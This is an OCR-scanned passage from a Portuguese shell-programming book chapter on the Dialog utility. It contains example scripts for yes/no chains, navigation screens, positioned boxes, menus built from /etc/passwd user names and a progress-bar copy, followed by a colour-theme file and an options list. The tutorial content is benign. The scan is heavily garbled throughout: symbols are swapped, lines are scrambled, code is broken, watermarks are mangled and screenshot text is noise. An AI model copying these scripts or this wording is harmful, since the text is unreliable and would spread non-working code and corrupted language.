# Útil para fazer programas ou b rincadeiras onde só há um 
8 caminho cecto a seguir para cheg.1r ao final . 
j 
FLUXOGRANA 
i! • • • 
~ 
f 
~ 
i • • 
i! 
;; 
i! 
11 
I NICIO 
+-------+ 
I telal 1·-Cancel / Esc--->---+ 
+--0):---+ 
I tela2 1--cancel /Esc--->---+ 
+- -Ok---+ 
1- --> 
I tcla3 1·-Cancel/ Esc--->---+ 
+--ok---+ 
I tela4 1--Cancel / Esc--->---+ 
+--01:---+ 
I final I 
+-------+ 
FIM 
i Função r âpida par a chank1r a cai xa YesNo 
s inmao () ( 
di alog - - yesno " s~ ·· O O 
s i mnao ' Quer continuar? ' && 
s.inu1ao • E.stanto.s na s egunda t e l a . continua? ' 
t.& 
:simnAo ' Tercei.ra . Continua continuando? ' 
&& 
+ ......................... + 
I desistiu I 
+----------+ 
Mate ria com d r bs a;.Jtora!S 
simnao 'Penúltima tela ! E agora , continua? ' && 
echo ' Você chegou até o final !' && exit 
i Este trecho já não faz mais parte do encadeamento, e só 
w será alcançado caso o usuário tenha apertado CANCELAR/Esc . 
echo Você desistiu antes de chegar no final . . . 
Dialog 
477 
Baixar este script em: http://www.aurelio.net/shell/dialog/encadeado.sh 
Exemplo de Telas com Navegação Completa {Ida e Volta) 
IIYI"e ,...,. solto 
. ....... 
l!\11"'0 de novo 
.., .. de l5 ...-.as 
ft!fW'"w ; p 1 .s 
entre 25 t' 40 ._ 
u is de- 40 an::. 
Os dados lnf,_ for• 
HoM : llrêl to Krlnho Jargas 
Idade : entre 15 e 25 ..-.os 
Casado: cuado 
Cottoo: 
andr de btclclew 
hcar na inter-net 
dono!• 
I 
478 Programação Shell Linux 
il !/bin/bash 
f navegando .s h - o script que vai e volta 
i Este !IC.ript faz parte do http: I /atu::e.lio. net/shell/di alog 
11 
é Bxemplo de como l igar ~odas as tolas do programa entro s i, 
# guardando informações de ida e vol~a. o botão c.~CELAR faz 
~ voltar para a tela anterior e o OK faz ir a próxima . Para 
# sair do programa a qualquer momento basta apertar o ESC. 
~ 
i Útil para fazer programas inter~ tivos, d e contexto, ou q ue 
i 
~e pode voltar para corrijir informações. 
il 
íl FLUXOGRAHA 
INÍCIO 
a 
+-----~-·--- + 
iJ 
I primeira 
1--Esc--->---+ 
• 
.--------> +----ok-----+ 
~ 
• --Cancel-- 1 
nome 
1--Bsc--->---+ 
~ 
.--------> +----Ok-----+ 
+----------+ 
IJ 
'-- Cancel- - 1 
idade 
1--Bsc- - ->- --+--- > 
Sai do 
ti 
• - --- ----> +- - --Ok----- + 
I Programa I 
@ 
' - -caneel-- 1 ese . eivil 1- -Bse- -->---+ 
+----------+ 
f 
. --------> +----ok-----+ 
I 
j 
' --Ctlncel -- 1 
go:sto~ 
1- -E.:!Sc--->---+ 
il 
+----ok-----+ 
i 
fih al 
j 
+--------- -- + 
j 
FU1 
í! 
proxima=pr imeira 
il loop principal 
"hile : ; do 
I# Aqui é identificada qual tela deve ser mostrada. 
i# Em cada tela são definidas as variáveis ' anterior ' 
f# e ' proxi ma' # que clerinem os rumos da navegação. 
case •· Spr oxi.ma" in 
primeira) 
pxoximd-noro.e 
dialog --backtitle 'Pe9ador de Dad os' \ 
--msgbo~ 'Bem-vindo ao pogador de dados!' O O 
nome} 
an~erior=primeira 
proxima=idade 
Mate ria com d r bs a;.Jtora!S 
nome $(dialo9 - - stdout \ 
--backtitle ' Pe9ador de Dados' \ 
--inputbox ' Seu nome : ' O 01 
; ; 
idade) 
anterior=nome 
proxima• casado 
idade•S(dialog --stdout \ 
--backtitle ' Pegador de Dados ' 
\ 
--menu 'Qual a sua idade? ' O O O \ 
casado) 
'menos de 15 anos ' 
•' \ 
'entre 15 e 25 anos ' '' \ 
'entre 25 e 40 anos ' '' \ 
' mais de 40 anos' 
.. 
anterior~idade 
proxima•9ostos 
casado•S(dialog --stdout \ 
--backtitle ' Pegador de Dados ' 
--radiolist ' Estado civil :' O O 
' solteiro ' ' livre leve solto ' ON 
\ 
' noivo ' 
'casado ' 
'viúvo ' 
'quase amarrado ' 
' já era ' 
o \ 
\ 
\ 
\ 
OFF 
' livre de novo ' 
gostos) 
anterior=casado 
proxima•final 
90stos•S(dialog --stdout \ 
--separate- output 
--backtitle ' Pegador de Dados ' 
OFF 
OFF 
--checklist ' Do que 
' jogar futebol ' 
'pescar ' 
você 90sta? ' 
off \ 
\ 
\ 
o o o \ 
' ir ao shopping ' 
' andar de bicicleta ' 
'' off \ 
off \ 
off \ 
'ficar na internet ' 
'' off \ 
'dormir ' 
•' off ) 
final I 
dialog \ 
--cr-wrap \ 
--sleep 5 \ 
Dialog 
479 
480 Programação Shell Linux 
don~ 
*) 
esac 
--backtitle ' Pegador de Dados' 
\ 
--title 'Obrigado por responder ' \ 
--i nf obox .. 
Os dados informados foram 
Nome 
Snome 
Idade : Sidade 
casado : Scasado 
Gostos : \nSgostos 
.. 14 4 0 
b.reak 
echo "Janela desconhecida ' Sp.roxima ' ." 
echo Abortando programa ... 
exit 
W Aqui ê feito o tratamento genêrico de Código de Retorno 
W de todas as telas . Vol ta para a tel a anterior se for 
H CANCELAR, sai do programa se for ESC. 
retorno• $? 
$retorno - eq 1 
Sretorno - eq 255 
&& proxima•$anterior 
&& break 
H cancelar 
8 Esc 
Baixar este script em: http://www.aurelio.neUshell/dialog/navegando.sh 
Exemplo de Pedido de Confirmação (Uma Caixa Sobre 
Outra) 
Cowtsht (C) lll89, 1991 Free Soft•are Fcxmatton, Inc. 
Ever~:~ane is per 
of this li""""e Yoc8 aceita os Tl!t'oos da 
Licença? 
lhe lieemes f 
~ 
< l!o > 
freedo~t to share liiiiiiiiiiiiiiiiliÍ 
License is intendel 
e, HA 02139, 
ati" copies 
alloooed, 
M 
m 
i ! /bil"l/Sh 
i duas .sh - o script que pede confirmação 
§ !:;st.e s cript fa z parte do htt p:// aurel i o .net/sh ell/dialo9 
! 
!! Exemplo de c omo fa1:er caixas sobrepost.as, onde a no·..ra c aixa 
f aparece sobre a primeira, t ipico de avisos como: 
~ 
~ 
"Você tem cexteza? '• 
# 
# O font e do pcóprio ~cr ipt é usc1do como a "licença" , mas na 
i vida real, basta tJ:ocar o $0 por um arquivo como o COPYING 
ii 
dialoq --titl e 
' I~ICENÇA do Soft\'lare' --textbox SO 16 6 5 \ 
--and -t-:idget \ 
--yesno 
' \nvoc~ acei ta o:5 Tern\0$ da Licença?' a 30 
Baixar este script em: http://www.aurelio.net/shell/dialog/duas.sh 
Dialog 
481 
Exemplo de Posicionamento de Caixas (Não Centralizado) 
! !/bin/sh 
Eu estou srudada no canto 
esquerdo 
g posi cao.sh -
o script qu ~ posiciond a j anel a 
i Es te sc.ript f az p .:u:te d o http://aurel io.ne t /sh ell/ di a log 
11 
r Com a opção --begin, ~ p oss1 vel de!inir qual vai ser o 
i posi <::ionamento da caixa n a t e l a . l•. s i n t a xe é " --begi n X Y'', 
e onde X e 'i são as coordenadas de LINHl .. e COLUNP. onde vai 
i estar o canto s uperior esquerdo da caixa . 
B 
Mate 
com d r~11os autCYa s 
482 Programação Shell Unux 
! Por exemplo , para grudar a caixa no canto esquerdo da tela, 
f à parti r da linha 5: 
d i alog --begin S O \ 
--t't'l!lgbox •gu e-stou 9rudada no canto esquerdo' 10 30 
Baixar este script em: http://www.aurelio.neUshell/dialog/posicao.sh 
Exemplo de Várias Caixas na Mesma Tela (Multicaixas!) 
Janela •1 -- (0,0) 
Janela 12 -- (0,40) 
• •• 
• •• 
Janela •3 -- (12,0) 
Janela 14 -
(12.40) 
Mâ!CIIal 
r 1 d r ~ 
iliS 
il !/bin/sh 
I multi . sh - o sc.tipt que desenha vá.cias janelc;1;3 
# Esee s c r ipe fa-z parte do http: //aureli o .net/shell/dialo9 
~ 
ê Exemplo de como desenh ar várias ca.ixas numa mesma tela 1 
!J usando a opçc1o --and- l>i'idget para j untar as caixas e o opçAo 
j --beqin para pocisionar as janelas . 
• 
! 
i 
Brincand o de Posicionar Caixas 
# 
------------------------------
• 
i Usando a opção --begin , d efinimos o posici o namento da 
if. ca ixa. . usando a opçcto --and- \üdget, colocamos mais de uma 
j cai xa na tela . Usando essas duas opç ões j untas, pode mos 
# most ra~ vâ r i as janelas intei ras na t el a sem sobrepos i ção ! 
~ 
i Pot e:':emplo, que t a l divi d ir .:a tela em 4 paxtes i guai$ e 
ê colocar uma janela em cada uma dessas partes? Isso pode ser 
tJ Ut.il par a mostrar ao usuário o .. histórico" das telas que 
i# ele j â passou. 
8 
M o câlculo de posiciontlmento e s i mpl es . o t amanho padrão de 
~ fé l a do éó~solé ê SO éolu~às pot 25 linhãs . 
~ara fa~ilitá r , 
ti con.side.remos o tanlanho da. t ela de SOx24, 
par~ usarmo~ 
j 
núme ros pa res somente . A úl tima l inha da tela não será 
I# usada. 
~ 
# Se que~emos 4 cai>:as , basta d i vidic tanto as colun as qua nto 
# as l inhas por 2 e teremos quatro "pedaços n iguais na t.el a : 
• 
# 
I • 
B0/2 
40 
25/2 -
12 
# com isso, sabemos que todas as j a nela s t erao 12 linhas e 40 
! col unas . Esses núrne.ros também definem as coorde nadas de 
i posicionamet o : 
I 
I 
~ 
f 
il 
f 
f 
il 
~ 
8 
il 
coo<denadas : 
( " ' y ) 
O, O 
0 , 40 
12 , o 
12 , 40 
o 
40 
SO col u nas 
0+---------+- --- -----+ 
I 0, 0 
I 0, 40 
I 
I 
iH I 
#2 
I 
12+--------- +- ----- --- + 
I 12 , 0 
I 12,40 
I 
~3
1 
#4 
24+--------- +---------+ 
linha.'3 
Dialog 
483 
Mate ria com d r bs a;.Jtora!S 
484 Programação Shell Unux 
il 
I Obs .: O --no-shadow é usado para que a caixa não tenha 
i 
sombr:a . 
11 
dialog --no- shadoy; \ 
--begi n 
o o --m.sgbox 'Janel a u 
(0, 0) 
12 40 --and-widget 
' 
--begin 
o 40 --msgbox 'Janela #2 
(0, 40) 
12 40 --and- widget 
' 
--begin 
12 o --msgbox 'Janela il3 
(12, 0) 
12 40 --and-widget 
' 
--begin 
12 40 --msgbox 'Janela 14 
(12, 40). 12 40 
11 Frac ionando mais as coordenadas, dá pra fazer muitas firulas . 
ii 100% inútil, mas é legal de ver & : ) 
f 
dialog --no-shadoH \ 
--begin o o --infobox DIALOG 6 20 --and->ridget \ 
--begi n o 40 --infobox DIALOG 6 20 --and-widget \ 
--begin 
6 20 --infobox DIALOG 6 20 --and-\-tidget \ 
--begin 
6 60 --infobox DIALOG 6 20 --and-widget \ 
--begin 12 o --i nfobox DIALOG 6 20 --and-widget \ 
--begin 12 40 --infobox DIALOG 6 20 --and-widget \ 
--b~gin 18 20 --infobox DIALOG 6 20 --and- widget \ 
--sleep 6 --begin 18 60 --i nfobox DIALOG 6 20 
Baixar este script em: http://www.aurelio.net/shell/dialog/multi.sh 
Exemplo de Menu com Itens Dinâmicos (Definidos em 
Execução) 
Do i s: caJ~pos por- 1 i nha, 2o i te" co" 
espaços 
'(•)----------
IW)aill'ldl -
m;td:r. ~ ~!ce Use:. 
pçap 
xfs 
X Font Serv.,. 
,_.j 
-
"''JS'tl 
l'liSQ. Sorver 
postcres PostgreSill Serv..-
i!')" ,.§tf!f <C•ulcr) 
M 
m 
#!/bin/bash 
i users .sh - Compõe menus com os usuários do sis~ema 
fi Este script faz parte do http : //aurelio .net/shell/dialog 
lt 
fi Exemplo de como construir menus dinâmicos, onde os itens 
i são a saida de um comando . Nos exemplos, serão obtidos os 
1t dados do arquivo /etc/passwd, como login, UID e nome . 
f 
lt São três exemplos : 
# 
i 
l) O mais simples . O comando retorna um login por linha . 
i 
Como cada entrada do menu precisa de dois campos, no 
I 
segundo campo foi colocado uma letra ' o ', para ficar 
f 
esteticamente bonito . Poderia ser um ponto ' .' ou 
f 
qualquer outro caractere ou texto . Outra alternativa 
I 
é repetir o login . Isso pode ser feito trocando o 
I 
comando sed para ' s/ .*/& &/ '. 
ii 
i 
2) Aqui, o próprio comando já retorna dois campos por 
~ 
linha , no formato login :uid . Depois foi usado o tr 
N 
pra trocar os : por espaços, separando os dados e 
N 
deixando pronto para usar no menu . 
' 
~ 
3) Similar ao segundo, só que ao invés de pegar o 3o 
I 
campo do passwd (uid) , foi pego o 5o, que é o nome 
I 
completo do usuário . O grande problema aqui é que 
i 
como o nome tem espaços em branco, cada palavra é 
i 
encarada como um parâmetro e bagunça o menu . A 
li 
solução é colocar o nome entre \ "aspas escapadas\" 
i 
e usar o 'eval ' para executar o comando . 
lt 
11 
Para ficar bem claro o que está acontecendo, troque 
i 
o 'eval ' por um 'echo ' para ver qual o comando final 
i 
que está sendo executado . Aqui está ele : 
j 
f dialog --menu "Dois campos por linha, 2o item com espaços" 
i O O O root "root" bin "bin" daemon "daemon" adm "adm" 
I lp "lp" sync "sync" shutdown "shutdown" hal1: "halt" 
i mail "mail" news "news" uucp "uucp" operator "operator" 
I games "games " gopher "gopher" ftp "FTP User" 
ii 
ii 12 Agosto 2004 - Aurélio Marinho Jargas 
ARQUIVO=/etc/passwd 
Dialog 
485 
486 Programação Shell Linux 
dialog --menu ' Lista normal de um campo por linha ' \ 
O O 10 $(cat $ARQUIVO I cut -d : - fl I sed ' s/S/ o/ ' ) 
dialog --menu ' Dois campos por linha , sem espaços nos itens ' \ 
O O 10 $(cat $ARQUIVO I cut -d : -fl , 3 I tr : ' ') 
eval \ 
dialog --menu \ "Dois campos por linha , 2o item com espaços\" \ 
04010$( 
) 
IFS= : 
while read login senha uid gid nome resto; do 
echo Sl ogin \ "$nome\" 
done < $ARQUIVO 
Baixar este script em: http://www.aurelio.neUshell/dialog/users.sh 
Exemplo de Cópia de Arquivos com Barra de Progresso 
(Gauge) 
Ulp lardl~ ••• 
Copiando o diretório l•p3/punk 
para /t•p 
Dialog 
487 
il ! /bin/bash 
ª copydir . sh - copia o diretôrio mos~rando uma barra de pcoqresso 
# Este s c .r i pe faz parte do http://aurelio . net/shell/dialog 
~ 
i Uso : 
copydi r . s h 
<dir- origem> 
<di r · destino> 
íl 
f Exemplo de uso da caixa d e barra de pr ogresso {gauge ) , que é 
M diferente ~ m~io compl icada de uso~ . El a espero rec~ber a 
j porcentagem da barra via STDil-l 1 .sendo um número de O a 100 . 
• 
tJ o Gauge só rnost.ca na tela a poreeneagem que você i nformat, 
i ele não tem intel i gência, entAo todo o controle sobre o 
# processo deve ser fei to manualmente pelo programador . 
íl 
e o procedi men to se resume em duas a ç ões : 
I 
I 
1} Saber como quan ti ficar o TOTAL, pa.ra conhece r o 100 %. 
I 
No cas o de uma cOpia de (1rqui vos , o TOTAL ê o tamanho 
8 
totql de t odos os arquivo~ a serem copiados . 
i! 
8 
2) 
s ~bet como de~eob rir de t~mpos ~m t empo~ o STATUS 
5 
cor rente do procedimento, enquanto ele está sendo 
~ 
executado, para poder calcular o quanto ainda falta 
i 
pata o final (lOO':o- J . No c.aso ele uma cópia de atqui vos, 
# 
o STATUS e a quantidade de arquivos que ja foi copi ada, 
# 
ou o espaço em disco o,cupado por eles . 
il 
i Tend o os doi s dados não, 
u~ simples regtinha de três lhe dâ 
i a porcentagem atual do anda~ento: STATUs• lOO/TOT~~ . 
B 
i! 12 1\gosto 2004 - i'.urélio Harinho Ja r gas 
iJ • • •• • • • • • • • • • • •• • • • •• • •• •• • • • • •• • ••• •• • • • • •• • • • • • • • •• •• •• •• • •••• 
TITLE:.= • Copitmdo . . . • 
f'ofSG.:::'Copiando o diret ório $0RIGE!4 pa1:a $DESTINO' 
!NTERVI\L0-1 
PORCENTO=O 
M inter valo de atual i 2açâo da barra (segundos) 
li porcentagem inicial dcl ba .t:.ra 
;; ..... .. ... ........... .... ...... .... ... ........ ....... ..... ..... . 
0RlGEM=" ${ l t /) " 
DESTIN0=" $ {2%/J " 
Mate ria com d r bs a;.Jtora!S 
488 Programação Shell Linux 
di e() 
s.Lzeo( () 
echo "Erro: $ •n ; exic 1 ; l 
du - s "$1" 1 cut - f l ; ) 
runn i ng(){ ps $1 I grep Sl >/dev/null ; I 
. ..... .... ... .... ...... .......... ... ..... .. ....... ... ... .. ....... 
J tem somen~e dois parãme~ros? 
( " $2" ] 
l i die "Uso : $0 dir- origem dir- destiho" 
j a origem e o descino devem ser diretorias 
( -d " $0R1Gf:M" 
l i die "A origem ' $ORI GEM' dêvé ser um diretório" 
[ -d "$DESTINO" 1 li die "O destino ' $DESTINO' deve ser um diret ôri o" 
j mesmo dir? 
{ " SORIGE:r.t" = '' $ DESTINO" ] 
&& 
di e "A origem e o destino são o me.5mo diretório" 
B o di retóri o de des tino estA vazi o? 
DI R_DESTI NO="SDESTINO/$ (ORIGEMU'/1 " 
1 - d 
" $D I R_ DBSTINO" 
) 
&& 1 $ (sizeof $DIR_ DESTINO ) - gt 4 ) H 
die "O dit de destino 'S DIR_DESTINO' deveria estar vazio" 
j ................ . .............. . ......... . ........ . ...... .. .... . 
ti expansão das variáveis da me nsagem 
HSG~ S ( eval echo SHSG) 
I total a copia4 (em bytes) 
TOTAL• $ (si!cof SORIGEH) 
i inicio da cópia, em segundo p l ano 
cp -r SORIGEH $DESTINO ' 
CPPID=$! 
# caso o usuá rio cancelo, in~errompe a cópi a 
trap "til l $CPPID" 2 15 
• 
~ .......... ..... ... ....... ..... ........ .. .. .... ...... ........ .. . . 
~ loop de checagem de s tatus da cópia 
# enquanco o processo de copia estiver rodando 
while runnin9 $CPPID; do 
M quan~o já foi copiado? 
COP I ADO=$ ( sizoof $DIR_ DESTHJO) 
Mate ria com d r bs a;.Jtora!S 
done 
li qual a porcentagem do total ? 
PORCBN1'AG!.:M=S ( (COPI!\00' 100/TOTAL)) 
# ~nvi a a po rcen~agem para o dialog 
echo $PORCENTAGEM 
lf aguarda at é a prôxirna checagem 
ol eep $INTERVALO 
H cópia finttli=ada, mo~ tra a poret:!:ntAgem fina l 
echo 100 
) I di alo9 - -title " STITLE" - -gauge '"SNSG" 8 40 0 
Dialog 
489 
.. 
"" .. "" .. " .... " .... " .. " ...... ". " ." .. " .. ... ... " .. "
. 
echo OK -
Di~etôxio copi ado 
Baixar este script em: http://www.aurelio.neVshell/dialog/copydir.sh 
Configurando as Cores das Caixas 
É possível configurar as cores de TODOS os componentes das caixas, 
como textos, borda, botões e fundo da tela. Dessa maneira pode-se perso-
nalizar os programas que usam o Dialog para a empresa ou indivíduo que 
o utilizará. 
Para obter o arquivo padrão de configuração do Dialog, basta usar a op-
ção --create-rc . Como o programa procura dentro de seu $HOHE por um 
arquivo chamado . dial ogrc, use este comando para começar a brincar de 
trocar as cores do Dialog: 
d.ialog --create- rc $HOME/ .d.ialogrc 
Agora, basta editar o arquivo .dialogrc recém-criado no seu SHOJ•1E e 
executar o Dialog para ver a diferença. 
As cores que ele reconhece são: 
BLACK, RED, GREEN, YELLOW, BLUE, t-IAGENTA, CYAN e WHI1'E 
Mate ria com d r bs a;.Jtora!S 
490 Programação Shell Linux 
O formato das configurações de cores é: 
nome_do_componente = (letra, fundo, letra brilhante?) 
Onde para letra e fundo basta colocar os nomes das cores em inglês, e 
no terceiro parâmetro, coloque oN ou or: para que as letras fiquem brilhan-
tes ou não (claras ou escuras). Exemplo: 
!GREEN, BLACK, OFF) = fundo preto, letra verde escuro 
(GREEN , BLACK, ON) = fundo preto, letra verde claro 
Depois de terminar de configurar as cores, você pode salvar tudo num 
arquivo separado, e fazer vários arquivos diferentes para vários "temas" ou 
configurações diferentes. 
Para instruir o Dialog a utilizar um arquivo de configuração específico, 
e não o padrão $HO~E/ . dialogrc , basta definir a variável de ambiente 
sorALOGRC com o nome arquivo a ser utilizado, por exemplo: 
export D!ALOGRC•SHOME/dialog/tema-verde.cfg 
./navegando . sh 
Como exemplo, este é o arquivo que configurou o Dialog para esse tema 
tipo console verde: 
• 
~f'ma "Verde" upo console para o Dialog . 
• Autor : Aurel c Marinho Jargas 
• 
Salvar este arquivo como SHOME/ .dialogrc 
• 
ou de!nlr a variàve: SD:ALOGRC 
!f; screen 
use_shadot·l 
use colors 
screen_col o .r 
# bo:-: 
OFF 
ON 
(GREEN, BI.~.CK, ON) 
dial og_col o r • 
(BLACK,GREBN,OFF) 
t.itl ê co lor 
border_col o r 
(BLACK, GRSEN, O?F) 
(!lLACK, GREBN, OFF) 
8 button 
but~on_act ive_eolor 
button_inactive_color 
button_ key_acti ve_col or 
button_key_inact i ve_color 
button_ l abel_ac t ive_ color 
(llLACK, GREBN , O FF) 
• 
(Bk\CK, GREEN, OFFI 
• 
(GREEN, llLACK, Of F) 
(BLACK, GREEN, OFF) 
• 
(GREEN , BLACK,Off) 
button_l~bel_inact ive_colo r = (BLACK, GREEN, OFF) 
i input 
inputbox_col or 
= (GREEN, BLACK, ON) 
inputbox_bor de r_color = (GREEN, Bk"\CK, ON) 
ô text box 
searchbox_color 
stoarchbox_title_color 
searchbo;.~_ho tdex _ color 
= (GREEN,BLACK, ON) 
(GREEII , BL.'\CK, OF!1'( 
(GREEII, BLACK, OF!') 
pos i t i on_i ndicat or_col or -
(SLACK,GREEN,OFF) 
j Nenu hox 
menubox_col or 
menubox border_color 
M Nenu wi ndow 
item_color 
i~em sel ected_color 
tag_eol or 
tag_se l ected_color 
= {GREEN, BLACK, OFF) 
(GREEN, BLACK, Of f l 
(GREEN, BLACK, OFf) 
~ (BLACK, GREEN, OFE') 
(GREEN, BL.>.CK, Of f) 
~ {BJ,ACK, GRF.EN, OFFI 
tag_key_colo< 
{GREEN, BV.CK, Of'FI 
tag_t.ey _sel ectcd_ color • 
( BLJ<CK, GREEN, OFFI 
check_<::otor 
check .selcc t<>d_c olor 
uarrow_col o r 
dc"\rro\~_color 
j; Nenu item help 
itemhel p_colo.r 
{GREEN, BJ.f..CK, OI!' FI 
• 
(BLACK, GREEN, OFF) 
{GREEN, BLJ...CK, ON) 
{GREEN, BLACK, ON) 
~ (GREEN, BLACI<, ON) 
Dialog 
491 
Baixar este arquivo em: http://www.aurelio.neUshell/dialog/tema-verde.efg 
Mate 
com d r~1tos autCYa s 
492 Programação Shelllinux 
lista das Opções de Linha de Comando 
Opções para definir os textos da caixa 
--backtitle <texto> 
Especifica o titulo do topo da tela, que fica no plano de fundo, atrás da 
caixa (Veja exemplo do "Pegador de Dados"). 
--ti tle <texto> 
Define o título da caixa, colocado centralizado na borda superior. 
--cancel- label <texto> 
Especifica o texto para ser mostrado no botão CANCEL . 
--exit- label <texto> 
Especifica o texto para ser mostrado no botão EXIT . 
--help-label <texto> 
Especifica o texto para ser mostrado no botão HELP. 
--ok- l abel <texto> 
Especifica o texto para ser mostrado no botão oK. 
Opções para fazer ajustes no texto da caixa 
--cr-wrap 
Mantém as quebras de linha originais do texto da caixa, para não pre-
cisar colocar os \n . Mas lembre-se que caso a linha fique muito gran-
de, o Dialog a quebrará no meio para caber na caixa. 
--no-collapse 
Mantém o espaçamento original do texto, não retirando os <TAB> nem 
os espaços em branco consecutivos. 
--tab-correct 
Converte cada <TAB> para N espaços. O N é especificado na opção 
--tab- len ou o padrão 8 é assumido. 
--tab- len <N> 
Especifica o número de espaços que serão colocados no lugar de 
cada <TAB>, quando usar o opção --tab- correct . 
Dialog 
493 
--trim 
Limpa o texto da caixa, apagando espaços em branco no início, espa-
ços consecutivos e quebras de linha literais. 
Opções para fazer ajustes na caixa 
- - aspect <taxa.> 
Taxa que ajusta o dimensionamento automático das caixas. É a re-
lação largura I altura, sendo o padrão 9, que significa 9 colunas para 
cada linha. 
--begin <y> <x> 
Especifica a posição inicial da caixa, relativo ao canto superior 
esquerdo. 
--dofaultno 
Faz o botão NÃO ser o padrão da caixa YesNo. 
--dcf ault- itcm <item> 
Define qual vai ser o item pré-selecionado do Menu. Se não especifi-
cado, o primeiro item será o selecionado. 
--shad0\'1" 
Desenha a sombra da caixa. Opção já usada normalmente. 
--no- s hadow 
Não desenha a sombra da caixa. 
--no - cancel ou --nocance1 
Não mostra o botão C.".NCEL.".R nas caixas Checklist, lnputbox e Menu. 
A tecla <ESC> continua valendo para sair da caixa. 
- - i'&em- help 
Usada nas caixas Checklist, Radiolist ou Menu, mostra uma linha de 
ajuda no rodapé da tela para o item selecionado. Esse texto é decla-
rado adicionando-se uma nova coluna no final da definição de cada 
item. 
--help-button 
Mostra um botão de HELP. Seu código de retorno é 2. 
Mate 
com d r~•los autCYa s 
494 Programação Shell Linux 
Opções relativas aos dados informados pelo usuário 
- -separate-output 
Na caixa Checklist, retoma os itens selecionados, um por linha e sem 
aspas. Bom para scripts! 
--separate-widget <separador> 
Define o separador que será colocado entre os retornos de cada cai-
xa. Útil quando se trabalha com múltiplas caixas. O separador padrão 
é O <TAB> . 
--stderr 
Retoma os dados na Saída de Erros (STDERR). Opção já usada nor-
malmente. 
--stdout 
Retoma os dados na Saída Padrão (STDoun ao invés da saida de 
erros (STDERR). 
--max-input <tamanho> 
Tamanho máximo do texto que o usuário pode digitar nas caixas. O 
tamanho padrão é 2000 caracteres. 
Outras 
--ignore 
Ignora as opções inválidas. Serve para manter compatibilidade apenas. 
--size-err 
Opção antiga que não é mais usada. 
--beep 
Apita cada vez que a tela é desenhada. 
--beep-after 
Apita na saída com o CTRL+C . 
--sleep <N> 
Faz uma pausa de N segundos após processar a caixa. Útil para a 
lnfobox. 
- -ti:neout <N> 
Sai do programa com erro, caso o usuário não faça nada em N se-
gundos. 
Dialog 
495 
--no- kill 
Coloca a caixa Tailboxbg em segundo plano (desabilitando seu srGHUP) 
e mostra o ID de seu processo (P/0) na saída de erros (STDERR) 
--print .. si=e 
Mostra o tamanho de cada caixa na saída de erros (STDERR). 
--and-\·Tidgei; 
Junta uma ou mais caixas numa mesma tela (sem limpá-la). 
Opções que devem ser usadas sozinhas na linha de 
comando 
--clecu: 
Restaura a tela caso o Dialog a tenha bagunçado. 
--create-rc <arquivo> 
Gera um arquivo de configuração do Dialog. 
--he l p 
Mostra a ajuda do Dialog, com as opções disponíveis. 
--pr in~-maxs ize 
Mostra o tamanho atual da tela na saída de erros (STDERR). 
--princ- version 
Mostra a versão do Dialog na saída de erros {STDERR). 
--version 
o mesmo que --pdnt-ver s i on . 
Os Clones: Xdialog, Kdialog, gdialog ... 
Todos os programas listados aqui são ' clones• do Dialog, pois foram feitos 
para substituir o Dialog, ou dar uma nova roupagem a ele usando bibliote-
cas gráficas. 
Os clones usam a mesma sintaxe, as mesmas opções de linha de coman-
do e todos têm o mesmo propósito: ser como o Dialog, só que diferente & : 1 
Além de fazer tudo o que o Dialog faz, alguns clones evoluíram e adicio-
naram novos tipos de caixa e funcionalidades novas. 
Mate ria com d r bs a;.Jtora!S 
496 Programação Shell Linux 
Whiptail 
Llhipt<ti I 
itens: 
Linux 
O do pingui~ 
Windo~s 
Aguele outro 
:nnt&IW•! sg, ... y 
8@h!44tl 
Clone modo texto, que usa a biblioteca newt: em vez da ncurses . 
Ele foi escrito pela Red Hat Software para ser utilizado na instalação 
modo texto do Red Hat Linux. Como é baseado numa versão antiga 
do Dialog, não tem suporte às caixas novas como calendar, fselect e 
tailbox. 
Pacote Debian: http://packages.debian.org/stable/base/whiptail.html 
Página de Manual: http://linux.math.tifr.res.in/manuals/man/whiptail.html 
Xdialog 
• 
\iii'IIOBDR 
tl• ", 
No ISSO 
OSIZ 
WINNT 
PCOOS 
MSOOS 
H i, thls is a menu boX. Vou ea.n uulhis to 
pre$ent a Ust ot ehofee.s for ttle user to 
ci'\OO$e. ff l"ere are more ltems lhan can ti1 
on the screen, 1he menu vAli be sttotted 
Try rt now! 
Choose lhe os you L'l<e: 
Another 6-ee UnlK Clone tor 3f ~ 
IBMOSIZ 
MICrosoft Windows NT 
IBM PC DOS 
Mletosoft DOS 
GJ 
Dialog 
497 
É o Dialog para a interface gráfica, que usa a biblioteca GTK+. 
É de longe o Dialog mais "turbinado", pois também tem o botão HELP 
que chama a tela de Ajuda da caixa e introduziu vários tipos novos de caixa 
como: treeview, buildlist, editbox, rangebox, logbox, spin boxes, combobox, 
colorsel, fontsel. 
É também o clone mais bem documentado, possuindo uma excelente 
homepage e documentação online. Em especial o sítio http://thgodef.nerim. 
net/xdíalog/doc/box.html da documentação mostra figuras (screenshots) de 
todas as caixas novas implementadas. 
Homepage: http://xdialog.dyns.net 
Documentação online: http://thgodef.nerim.net/xdialog/doc/index.html 
Kdialog 
S.,ltct" lat1911.)90: 
Amertt.UI EnOI•::.h 
Fn:nth 
Oz' l!ngli~ 
É o Dialog do time do KDE, que usa a biblioteca QT. Como os grandes 
"ambientes gráficos" gostam de reescrever todos os aplicativos existentes, 
com o Dialog não podia ser diferente. O Kdialog é o Dialog integrado com 
o ambiente KDE. 
FTP: ftp://ftp.kde.org/pub/kde/unstable/apps/utils/ 
Tutorial completo em inglês: http://developer.kde.org/documentation/tu-
torials/kdialog/t1 .html 
M 
m 
498 Programação Shell Linux 
gdialog 
System log and Process Viewer 
X 
Make your selection: 
www-
Web tral!lc tog 
Error -
Web Enor Log 
FTP -
FHe Transfer log 
l.ast -
La-st 50 connections 
1 Messages -
System Me$$age log 
Syslog -
System Log 
Oebug -
System lnfo 
Sudo -
Sudoets Log 
su -
Su rog file 
PS -
Proce$$ Status 
Netstat -
Networt;, Connections 
El<i1 -
Exit Viewer 
1( Cancel 
É o antigo Dialog do time do Gnome, que usa a biblioteca GTK. Aparente-
mente o Zenity (ver adiante) é o novo "Dialog oficial" do Gnome e o gdialog 
vai ser aposentado. O interessante desse clone é que carrega o nome do 
ilustre Alan Cox como desenvolvedor participante. 
Zenity 
El 
il C hoo:,..::- bugs ,rou o\I ISh to .1~::-.·. 
X 
Selecf llems from lhe llst below. 
Bug Number I 
Severlty I Descrfpijon 
992383 
Normal GtkTreeView crashes 
293823 
Hlgh 
GNOME Dl~onal)' d 
393823 
Criticai Menu ediffng does nc 
I.!.J, ______ 
_,I 
!.l 
x Qancel IIL. 
